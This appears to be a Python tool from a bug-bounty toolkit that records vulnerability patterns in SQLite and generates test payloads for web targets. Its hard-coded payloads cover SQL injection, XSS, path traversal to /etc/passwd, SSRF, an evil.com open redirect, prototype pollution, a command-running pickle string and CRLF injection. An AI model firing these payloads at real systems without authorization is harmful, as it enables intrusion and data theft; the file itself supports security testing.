#!/usr/bin/env python3
"""
BBHK Variant Generator - Creates vulnerability variants based on patterns
Implements Big Sleep-inspired variant analysis for bug hunting
"""

import re
import json
import sqlite3
import hashlib
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
import logging
from pathlib import Path

@dataclass
class VulnerabilityPattern:
    """Represents a vulnerability pattern"""
    pattern_id: str
    vuln_type: str
    pattern_regex: str
    context_hints: List[str]
    confidence: float
    source_report: Optional[str] = None

@dataclass
class Variant:
    """Represents a generated variant"""
    variant_id: str
    base_pattern: VulnerabilityPattern
    target_context: str
    variant_code: str
    test_payload: str
    confidence: float
    reasoning: str

class VariantGenerator:
    """Generates vulnerability variants based on known patterns"""
    
    def __init__(self, db_path: str = "data/bbhk.db"):
        self.db_path = db_path
        self.logger = logging.getLogger(__name__)
        
        # Variant generation strategies
        self.strategies = {
            'direct': self._generate_direct_variant,
            'semantic': self._generate_semantic_variant,
            'chain': self._generate_chain_variant,
            'context': self._generate_context_variant
        }
        
        # Initialize database
        self._init_database()
        
        # Load patterns
        self.patterns = self._load_patterns()
    
    def _init_database(self):
        """Initialize variant tracking tables"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS patterns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                pattern_id VARCHAR(100) UNIQUE,
                vulnerability_type VARCHAR(100),
                pattern_regex TEXT,
                context_hints TEXT,
                confidence_score FLOAT,
                success_rate FLOAT DEFAULT 0,
                source_report_id INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS variants (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                variant_id VARCHAR(100) UNIQUE,
                pattern_id VARCHAR(100),
                variant_code TEXT,
                test_payload TEXT,
                target_context TEXT,
                confidence FLOAT,
                reasoning TEXT,
                test_status VARCHAR(50) DEFAULT 'pending',
                result TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                tested_at TIMESTAMP,
                FOREIGN KEY (pattern_id) REFERENCES patterns(pattern_id)
            )
        """)
        
        conn.commit()
        conn.close()
    
    def _load_patterns(self) -> List[VulnerabilityPattern]:
        """Load patterns from database"""
        patterns = []
        
        # Add some default patterns if database is empty
        default_patterns = [
            # SQL Injection patterns
            VulnerabilityPattern(
                pattern_id="sqli_001",
                vuln_type="sqli",
                pattern_regex=r"(SELECT|INSERT|UPDATE|DELETE).*WHERE.*=\s*['\"]?\$?\{?[a-zA-Z_]+\}?['\"]?",
                context_hints=["login", "search", "filter", "sort"],
                confidence=0.8
            ),
            # XSS patterns
            VulnerabilityPattern(
                pattern_id="xss_001",
                vuln_type="xss",
                pattern_regex=r"(innerHTML|document\.write|eval)\s*\(.*user.*\)",
                context_hints=["comment", "profile", "message", "search"],
                confidence=0.7
            ),
            # IDOR patterns
            VulnerabilityPattern(
                pattern_id="idor_001",
                vuln_type="idor",
                pattern_regex=r"/api/.*/(user|account|profile|order)/\d+",
                context_hints=["api", "rest", "graphql", "endpoint"],
                confidence=0.6
            ),
            # SSRF patterns
            VulnerabilityPattern(
                pattern_id="ssrf_001",
                vuln_type="ssrf",
                pattern_regex=r"(fetch|request|get|post)\s*\(.*url.*\)",
                context_hints=["webhook", "callback", "import", "fetch"],
                confidence=0.7
            ),
            # Open Redirect patterns
            VulnerabilityPattern(
                pattern_id="redirect_001",
                vuln_type="open_redirect",
                pattern_regex=r"(redirect|return|next|continue).*=.*http",
                context_hints=["login", "logout", "oauth", "callback"],
                confidence=0.6
            )
        ]
        
        # Save default patterns if not exists
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        for pattern in default_patterns:
            cursor.execute("""
                INSERT OR IGNORE INTO patterns 
                (pattern_id, vulnerability_type, pattern_regex, context_hints, confidence_score)
                VALUES (?, ?, ?, ?, ?)
            """, (
                pattern.pattern_id,
                pattern.vuln_type,
                pattern.pattern_regex,
                json.dumps(pattern.context_hints),
                pattern.confidence
            ))
        
        conn.commit()
        
        # Load all patterns
        cursor.execute("SELECT * FROM patterns")
        
        for row in cursor.fetchall():
            patterns.append(VulnerabilityPattern(
                pattern_id=row[1],
                vuln_type=row[2],
                pattern_regex=row[3],
                context_hints=json.loads(row[4]) if row[4] else [],
                confidence=row[5] or 0.5,
                source_report=str(row[7]) if row[7] else None
            ))
        
        conn.close()
        
        return patterns
    
    def generate_variants(self, target: str, context: Dict, 
                         strategies: List[str] = None) -> List[Variant]:
        """Generate variants for a target"""
        variants = []
        
        if strategies is None:
            strategies = list(self.strategies.keys())
        
        for pattern in self.patterns:
            for strategy in strategies:
                if strategy in self.strategies:
                    variant = self.strategies[strategy](pattern, target, context)
                    if variant:
                        variants.append(variant)
                        self._save_variant(variant)
        
        # Sort by confidence
        variants.sort(key=lambda x: x.confidence, reverse=True)
        
        return variants
    
    def _generate_direct_variant(self, pattern: VulnerabilityPattern, 
                                target: str, context: Dict) -> Optional[Variant]:
        """Generate direct variant (same vuln, different location)"""
        # Look for similar endpoints/parameters
        if 'endpoints' not in context:
            return None
        
        matching_endpoints = []
        for endpoint in context.get('endpoints', []):
            for hint in pattern.context_hints:
                if hint.lower() in endpoint.lower():
                    matching_endpoints.append(endpoint)
                    break
        
        if not matching_endpoints:
            return None
        
        # Generate variant for best matching endpoint
        target_endpoint = matching_endpoints[0]
        
        # Create test payload based on vulnerability type
        payloads = {
            'sqli': "' OR '1'='1",
            'xss': "<script>alert('XSS')</script>",
            'idor': "../1337",
            'ssrf': "http://localhost:8080",
            'open_redirect': "//evil.com"
        }
        
        test_payload = payloads.get(pattern.vuln_type, "test")
        
        variant_id = hashlib.md5(
            f"{pattern.pattern_id}_{target_endpoint}_{test_payload}".encode()
        ).hexdigest()[:8]
        
        return Variant(
            variant_id=f"var_{variant_id}",
            base_pattern=pattern,
            target_context=target_endpoint,
            variant_code=f"Test {pattern.vuln_type} on {target_endpoint}",
            test_payload=test_payload,
            confidence=pattern.confidence * 0.8,
            reasoning=f"Direct variant: Similar endpoint found matching '{pattern.context_hints}'"
        )
    
    def _generate_semantic_variant(self, pattern: VulnerabilityPattern,
                                  target: str, context: Dict) -> Optional[Variant]:
        """Generate semantic variant (similar logic, different implementation)"""
        # Map vulnerability types to semantic equivalents
        semantic_map = {
            'sqli': ['nosql_injection', 'ldap_injection', 'xpath_injection'],
            'xss': ['template_injection', 'csv_injection'],
            'xxe': ['ssrf', 'file_inclusion'],
            'idor': ['privilege_escalation', 'auth_bypass'],
            'open_redirect': ['header_injection', 'crlf_injection']
        }
        
        if pattern.vuln_type not in semantic_map:
            return None
        
        # Pick a semantic equivalent
        for equivalent in semantic_map[pattern.vuln_type]:
            # Check if context supports this variant
            if self._context_supports_variant(equivalent, context):
                variant_id = hashlib.md5(
                    f"{pattern.pattern_id}_{equivalent}_{target}".encode()
                ).hexdigest()[:8]
                
                return Variant(
                    variant_id=f"sem_{variant_id}",
                    base_pattern=pattern,
                    target_context=target,
                    variant_code=f"Semantic variant: {pattern.vuln_type} → {equivalent}",
                    test_payload=self._get_semantic_payload(equivalent),
                    confidence=pattern.confidence * 0.6,
                    reasoning=f"Semantic variant: {pattern.vuln_type} logic applied as {equivalent}"
                )
        
        return None
    
    def _generate_chain_variant(self, pattern: VulnerabilityPattern,
                               target: str, context: Dict) -> Optional[Variant]:
        """Generate chained variant (combining multiple vulnerabilities)"""
        # Common vulnerability chains
        chains = {
            'xss': ['csrf', 'session_hijacking'],
            'idor': ['information_disclosure', 'privilege_escalation'],
            'ssrf': ['internal_scan', 'data_exfiltration'],
            'sqli': ['data_extraction', 'auth_bypass']
        }
        
        if pattern.vuln_type not in chains:
            return None
        
        chain_components = chains[pattern.vuln_type]
        
        variant_id = hashlib.md5(
            f"{pattern.pattern_id}_chain_{target}".encode()
        ).hexdigest()[:8]
        
        chain_payload = f"Chain: {pattern.vuln_type} → {' → '.join(chain_components)}"
        
        return Variant(
            variant_id=f"chn_{variant_id}",
            base_pattern=pattern,
            target_context=target,
            variant_code=f"Chain variant: {chain_payload}",
            test_payload=f"Multi-stage: {pattern.vuln_type} + {chain_components[0]}",
            confidence=pattern.confidence * 0.5,
            reasoning=f"Chain variant: Combining {pattern.vuln_type} with {chain_components}"
        )
    
    def _generate_context_variant(self, pattern: VulnerabilityPattern,
                                 target: str, context: Dict) -> Optional[Variant]:
        """Generate context-aware variant based on technology stack"""
        # Technology-specific variants
        tech_variants = {
            'php': {
                'sqli': "' UNION SELECT NULL--",
                'xss': "<?php echo 'XSS'; ?>",
                'lfi': "../../../../../../etc/passwd"
            },
            'nodejs': {
                'sqli': "' || '1'=='1",
                'xss': "${alert('XSS')}",
                'prototype_pollution': "__proto__[isAdmin]=true"
            },
            'python': {
                'sqli': "' OR 1=1#",
                'template_injection': "{{7*7}}",
                'pickle': "cos\\nsystem\\n(S'ls'\\ntR."
            }
        }
        
        # Detect technology from context
        tech = context.get('technology', 'unknown')
        
        if tech not in tech_variants:
            return None
        
        if pattern.vuln_type not in tech_variants[tech]:
            return None
        
        variant_id = hashlib.md5(
            f"{pattern.pattern_id}_{tech}_{target}".encode()
        ).hexdigest()[:8]
        
        return Variant(
            variant_id=f"ctx_{variant_id}",
            base_pattern=pattern,
            target_context=f"{target} ({tech})",
            variant_code=f"Context variant for {tech}",
            test_payload=tech_variants[tech][pattern.vuln_type],
            confidence=pattern.confidence * 0.7,
            reasoning=f"Context variant: {pattern.vuln_type} adapted for {tech} stack"
        )
    
    def _context_supports_variant(self, variant_type: str, context: Dict) -> bool:
        """Check if context supports a variant type"""
        # Simple heuristic checks
        support_indicators = {
            'nosql_injection': ['mongodb', 'couchdb', 'redis'],
            'ldap_injection': ['ldap', 'active_directory', 'login'],
            'template_injection': ['template', 'render', 'jinja', 'ejs'],
            'privilege_escalation': ['admin', 'role', 'permission'],
            'auth_bypass': ['auth', 'login', 'session']
        }
        
        if variant_type not in support_indicators:
            return False
        
        context_str = str(context).lower()
        
        for indicator in support_indicators[variant_type]:
            if indicator in context_str:
                return True
        
        return False
    
    def _get_semantic_payload(self, variant_type: str) -> str:
        """Get payload for semantic variant"""
        payloads = {
            'nosql_injection': '{"$ne": null}',
            'ldap_injection': '*)(uid=*',
            'xpath_injection': "' or '1'='1",
            'template_injection': '{{7*7}}',
            'csv_injection': '=1+1',
            'privilege_escalation': '../admin',
            'auth_bypass': 'admin',
            'header_injection': '\\r\\nX-Injection: true',
            'crlf_injection': '%0d%0aSet-Cookie: admin=true'
        }
        
        return payloads.get(variant_type, 'test')
    
    def _save_variant(self, variant: Variant):
        """Save variant to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute("""
                INSERT OR REPLACE INTO variants
                (variant_id, pattern_id, variant_code, test_payload, 
                 target_context, confidence, reasoning)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (
                variant.variant_id,
                variant.base_pattern.pattern_id,
                variant.variant_code,
                variant.test_payload,
                variant.target_context,
                variant.confidence,
                variant.reasoning
            ))
            
            conn.commit()
            
        except Exception as e:
            self.logger.error(f"Error saving variant: {e}")
        finally:
            conn.close()
    
    def get_pending_variants(self, limit: int = 10) -> List[Dict]:
        """Get variants pending testing"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT v.*, p.vulnerability_type
            FROM variants v
            JOIN patterns p ON v.pattern_id = p.pattern_id
            WHERE v.test_status = 'pending'
            ORDER BY v.confidence DESC
            LIMIT ?
        """, (limit,))
        
        columns = [desc[0] for desc in cursor.description]
        variants = []
        
        for row in cursor.fetchall():
            variants.append(dict(zip(columns, row)))
        
        conn.close()
        
        return variants
    
    def update_variant_result(self, variant_id: str, status: str, result: str):
        """Update variant test result"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            UPDATE variants
            SET test_status = ?, result = ?, tested_at = CURRENT_TIMESTAMP
            WHERE variant_id = ?
        """, (status, result, variant_id))
        
        # Update pattern success rate if variant succeeded
        if status == 'success':
            cursor.execute("""
                UPDATE patterns
                SET success_rate = (
                    SELECT CAST(SUM(CASE WHEN v.test_status = 'success' THEN 1 ELSE 0 END) AS FLOAT) / 
                           COUNT(*) 
                    FROM variants v
                    WHERE v.pattern_id = (
                        SELECT pattern_id FROM variants WHERE variant_id = ?
                    )
                )
                WHERE pattern_id = (
                    SELECT pattern_id FROM variants WHERE variant_id = ?
                )
            """, (variant_id, variant_id))
        
        conn.commit()
        conn.close()
    
    def get_statistics(self) -> Dict:
        """Get variant generation statistics"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        stats = {}
        
        # Total variants
        cursor.execute("SELECT COUNT(*) FROM variants")
        stats['total_variants'] = cursor.fetchone()[0]
        
        # By status
        cursor.execute("""
            SELECT test_status, COUNT(*)
            FROM variants
            GROUP BY test_status
        """)
        stats['by_status'] = dict(cursor.fetchall())
        
        # Success rate
        cursor.execute("""
            SELECT 
                CAST(SUM(CASE WHEN test_status = 'success' THEN 1 ELSE 0 END) AS FLOAT) / 
                NULLIF(SUM(CASE WHEN test_status != 'pending' THEN 1 ELSE 0 END), 0) * 100
            FROM variants
        """)
        stats['success_rate'] = cursor.fetchone()[0] or 0
        
        # Top patterns
        cursor.execute("""
            SELECT p.vulnerability_type, COUNT(v.id) as variant_count,
                   AVG(CASE WHEN v.test_status = 'success' THEN 1.0 ELSE 0.0 END) * 100 as success_rate
            FROM patterns p
            LEFT JOIN variants v ON p.pattern_id = v.pattern_id
            GROUP BY p.vulnerability_type
            ORDER BY variant_count DESC
            LIMIT 5
        """)
        
        stats['top_patterns'] = []
        for row in cursor.fetchall():
            stats['top_patterns'].append({
                'type': row[0],
                'variants': row[1],
                'success_rate': row[2] or 0
            })
        
        conn.close()
        
        return stats


def main():
    """CLI interface for variant generator"""
    import argparse
    
    parser = argparse.ArgumentParser(description='BBHK Variant Generator')
    parser.add_argument('action', choices=['generate', 'list', 'stats'],
                       help='Action to perform')
    parser.add_argument('--target', help='Target URL or domain')
    parser.add_argument('--strategy', choices=['direct', 'semantic', 'chain', 'context', 'all'],
                       default='all', help='Generation strategy')
    parser.add_argument('--limit', type=int, default=10,
                       help='Number of variants to generate/list')
    
    args = parser.parse_args()
    
    generator = VariantGenerator()
    
    if args.action == 'generate':
        if not args.target:
            print("Error: --target required for generation")
            return
        
        # Mock context for demo
        context = {
            'endpoints': ['/api/login', '/api/search', '/api/profile'],
            'technology': 'nodejs',
            'parameters': ['id', 'username', 'query', 'filter']
        }
        
        strategies = [args.strategy] if args.strategy != 'all' else None
        
        variants = generator.generate_variants(args.target, context, strategies)
        
        print(f"\nGenerated {len(variants)} variants for {args.target}:")
        for variant in variants[:args.limit]:
            print(f"\n[{variant.variant_id}] {variant.variant_code}")
            print(f"  Type: {variant.base_pattern.vuln_type}")
            print(f"  Payload: {variant.test_payload}")
            print(f"  Confidence: {variant.confidence:.2%}")
            print(f"  Reasoning: {variant.reasoning}")
    
    elif args.action == 'list':
        variants = generator.get_pending_variants(args.limit)
        print(f"\nPending variants ({len(variants)}):")
        for var in variants:
            print(f"- [{var['variant_id']}] {var['variant_code']}")
            print(f"  Payload: {var['test_payload']}")
            print(f"  Confidence: {var['confidence']:.2%}")
    
    elif args.action == 'stats':
        stats = generator.get_statistics()
        print("\n=== Variant Generation Statistics ===")
        print(f"Total Variants: {stats['total_variants']}")
        print(f"Success Rate: {stats['success_rate']:.1f}%")
        print(f"\nBy Status:")
        for status, count in stats['by_status'].items():
            print(f"  {status}: {count}")
        print(f"\nTop Patterns:")
        for pattern in stats['top_patterns']:
            print(f"  {pattern['type']}: {pattern['variants']} variants, {pattern['success_rate']:.1f}% success")


if __name__ == "__main__":
    main()